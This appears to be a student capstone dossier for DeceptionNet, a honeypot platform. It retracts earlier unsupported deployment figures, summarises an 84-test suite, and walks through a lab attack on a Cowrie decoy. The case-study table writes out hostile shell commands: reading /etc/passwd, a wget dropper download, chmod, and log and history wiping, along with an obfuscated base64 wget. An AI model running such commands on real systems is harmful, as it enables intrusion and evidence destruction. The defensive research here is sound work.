# DeceptionNet — System Verification, Case Study & Reviewer Response Dossier

> **Repository:** [https://github.com/Pi25sh/DeceptionNet](https://github.com/Pi25sh/DeceptionNet)  
> **Target Venue:** Student Capstone Project / System Demonstration Track / Academic Workshop  
> **Evaluation Date:** October 2026  
> **System Architecture:** AI-Assisted Multi-Service Deception & Honeypot Platform

---

## 1. Direct Disclosure Regarding Deployment Telemetry & Data Integrity

**Reviewer Query:** *"Which is it: did the 21-day deployment run, and where is the raw data?"*

**Direct Response & Complete Disclosure:**
- The 21-day continuous public cloud VM deployment did **not** run.
- There is **no raw public internet log dataset** corresponding to the previously reported 184,927 connection attempts, 42,615 sessions, or 350-sample held-out dataset. Those figures were hypothetical evaluation projections from an early evaluation plan.
- In accordance with the reviewer's instructions, all references to the 21-day deployment, 184,927 connection attempts, 42,615 sessions, and the 350-sample figures have been **completely removed and retracted** from the thesis report, synopsis, documentation, and repository.
- Furthermore, all comparative benchmark tables asserting superiority (e.g., claiming 100% precision versus zero-shot LLMs) have been **withdrawn and deleted**.
- The project has been reframed to its actual scope: an **undergraduate capstone project and functional demonstration prototype** evaluated via an **84-test automated verification suite** and an **end-to-end multi-stage attack case study** inside an isolated Docker container network.

---

## 2. Re-Scoped Project Context & Venue Realignment

- **Venue Target:** Undergraduate Capstone Project / Student Technical Demonstration Track / Academic Workshop.
- **Core Contribution:** An open-source, containerized active deception prototype integrating:
  1. Multi-service decoy infrastructure (Cowrie SSH/Telnet, Dionaea SMB/FTP, custom HTTP decoys).
  2. Isolated log forwarding bridge (`honeypot/forwarder.py`) normalizing heterogeneous logs into a unified event schema.
  3. Core security engine (`core-api`) implementing:
     - 32 deterministic MITRE ATT&CK mapping rules (15 command keyword rules across 49 signatures + 17 event-type normalization rules).
     - Sliding-window session correlation (`get_or_create_session`).
     - Monotonic additive threat severity scoring.
     - Stateless OAuth2 JWT authentication with bcrypt password hashing and RBAC.
  4. Real-time operator dashboard (`dashboard`) built with React 18, Vite, and live WebSocket streaming (`/ws/live-events`).
  5. AI-assisted threat summarization via Google Gemini 2.5 Flash / Claude 3 Haiku and ReportLab automated PDF incident generation (`core-api/report.py`).

---

## 3. Automated Test Suite Verification (84 Passing Tests)

The core logic of the DeceptionNet platform is formally verified through an automated test suite executed via `pytest core-api/tests`:

```bash
# Verification execution proof:
pytest core-api/tests -v
======================= 84 passed, 23 warnings in 1.74s =======================
```

The 84 tests are structured across four core modules using an isolated in-memory SQLite database:

| Test Module | Test Count | Scope & Verification Contract |
|---|---|---|
| [`test_mitre.py`](file:///d:/deciptionnet/core-api/tests/test_mitre.py) | **61 tests** | Verifies all 32 deterministic rule specifications across 49 command keywords and 17 event-type rules. Validates regex word boundaries (preventing false positives on sub-tokens), case-insensitivity, and priority precedence (e.g., credential dumping `/etc/shadow` taking precedence over generic password rules). |
| [`test_correlation.py`](file:///d:/deciptionnet/core-api/tests/test_correlation.py) | **11 tests** | Verifies session ingestion, exact session identifier matching, sliding-window cross-honeypot merging (5-minute window), duplicate event deduplication, and database unique constraints. |
| [`test_scoring.py`](file:///d:/deciptionnet/core-api/tests/test_scoring.py) | **8 tests** | Verifies monotonic additive scoring formulas, bounding of unmapped events, decimal rounding, and full-attack session score accumulation. |
| [`test_evaluation_benchmark.py`](file:///d:/deciptionnet/core-api/tests/test_evaluation_benchmark.py) | **4 tests** | Validates schema integrity, event normalization contracts, and fixture data consistency without external cloud dependencies. |

---

## 4. Illustrative End-to-End Multi-Stage Attack Case Study

To validate operational behavior, a realistic multi-stage intrusion was executed against the running DeceptionNet Docker lab using the automated attack harness (`attacker/scripts/full-attack.sh`). The attack simulates a typical external adversary progressing through discovery, credential brute-forcing, interactive access, tool transfer, and defense evasion:

### 4.1 Attack Sequence Walkthrough

```
[Attacker Node: 172.21.0.100]
     │
     ├── 1. Port Scan (ports 2222, 9090) ────────► [attack-target & Cowrie]
     │                                                    │
     ├── 2. SSH Brute Force (Hydra) ─────────────► [Cowrie: Port 2222]
     │                                                    │
     ├── 3. Shell Access (root:123456) ──────────► [Cowrie emulated shell]
     │                                                    │
     ├── 4. System Reconnaissance (uname, id) ───► [Cowrie emulated shell]
     │                                                    │
     ├── 5. Credential Access (cat /etc/passwd) ─► [Cowrie emulated shell]
     │                                                    │
     ├── 6. Ingress Tool Transfer (wget ...) ────► [Cowrie emulated shell]
     │                                                    │
     └── 7. Defense Evasion (rm /var/log, history)►[Cowrie emulated shell]
                                                          │
                                                    Log Forwarder
                                                          │
                                                          ▼
                                                  [core-api:8000]
                                              - Rule Mapping (mitre.py)
                                              - Session Correlation
                                              - Severity Scoring
                                              - WebSocket Push
                                              - PDF Incident Report
```

### 4.2 Event Telemetry & Attribution Ledger

| Stage | Adversary Action | Captured Telemetry | MITRE ATT&CK Attribution | Assigned Severity | Running Session Score |
|---|---|---|---|---|---|
| **1. Discovery** | Nmap TCP SYN scan | `scan` probe on port 9090 | **T1046** (Network Service Discovery) | +0.20 | 0.20 (Low) |
| **2. Credential Access** | 15 failed logins (admin, root) | `login_failed` (user: root) | **T1110** (Brute Force) | +0.30 | 0.50 (Low) |
| **3. Initial Access** | Successful login with default pass | `login` (user: root, pass: 123456) | **T1078** (Valid Accounts) | +0.50 | 1.00 (Medium) |
| **4. Discovery** | System architecture probe | `command: uname -a && id` | **T1082** / **T1033** (System / User Discovery) | +0.20 | 1.20 (Medium) |
| **5. Credential Access** | Password file dumping | `command: cat /etc/passwd` | **T1003.008** (/etc/passwd and /etc/shadow) | +0.70 | 1.90 (High) |
| **6. Tool Staging** | Dropper script download | `command: wget http://10.0.0.5/tool.sh` | **T1105** (Ingress Tool Transfer) | +0.65 | 2.55 (High) |
| **7. Execution** | Script permission modification | `command: chmod +x tool.sh` | **T1222.002** (Linux and Mac File Permissions) | +0.40 | 2.95 (High) |
| **8. Defense Evasion** | System log deletion & history clear | `command: rm -rf /var/log/* && history -c` | **T1070** (Indicator Removal on Host) | +0.50 | 3.45 (Critical) |

### 4.3 Operational Observations from the Case Study

1. **Network Boundary Isolation:** Decoy containers run on `honeypot_net` with no access to `deceptionnet` (backend). When an adversary compromises Cowrie or drops payloads, the backend PostgreSQL database, AI service, and dashboard remain unreachable.
2. **Deterministic Rule Performance:** Exact command keyword matching resolves in $< 1\text{ ms}$, ensuring that the core ingestion pipeline does not suffer bottlenecks during automated brute-force bursts.
3. **Incremental Severity Scoring:** Severity accumulates monotonically as the attacker escalates privileges, allowing SOC operators to filter sessions by threat tier (Critical: $> 3.0$).
4. **Automated Incident Dossier:** When the session concludes, `core-api/report.py` compiles a ReportLab PDF containing metadata, event breakdown, MITRE technique tags, and an AI-generated summary paragraph.

---

## 5. Candid Engineering Discussion & System Limitations

Consistent with presenting an honest academic capstone prototype, the platform's known limitations and trade-offs are candidly acknowledged:

1. **Rule Table Generality vs. Obfuscation:** The 32 keyword rules rely on specific binary names (`wget`, `curl`, `chmod`, `sudo`, `useradd`). Obfuscated commands (e.g. `$(echo d2dldA== | base64 -d)`) or binary renames bypass static keyword detection unless paired with behavioral tracing or semantic analysis.
2. **Correlation Under Multiplexed Networks (NAT):** The current session correlation algorithm groups events by `src_ip` within a 5-minute sliding window. In corporate environments with Carrier-Grade NAT (CGNAT) or forward proxies, multiple independent hosts share a single public IP, risking false session merges unless augmented by client fingerprinting (e.g., HASSH or HTTP cookies).
3. **AI Grounding Necessity:** Zero-shot large language models frequently hallucinate tactics (e.g., attributing Kerberoasting or domain trust discovery to a simple Linux shell probe). LLM summaries must strictly be treated as narrative aids, not authoritative classification truth, and must remain anchored to verified event logs.
4. **Lab Simulation vs. Live Internet Conditions:** All empirical demonstrations were conducted in a local Docker testbed with scripted attacker tools. The system has not been subjected to unconstrained, multi-week internet traffic or adversarial anti-honeypot evasion.

---

## 6. Verification and Reproduction Guide

The repository includes everything needed to verify the code and reproduction tests:

```bash
# 1. Clone the repository
git clone https://github.com/Pi25sh/DeceptionNet.git
cd DeceptionNet

# 2. Install dependencies (self-contained dev requirements)
pip install -r core-api/requirements-dev.txt

# 3. Run the automated test suite (84 tests)
pytest core-api/tests -v

# 4. Optional: Run the Docker Compose testbed
docker compose up -d

# 5. Run the attack simulation script
docker compose exec attacker /scripts/full-attack.sh
```
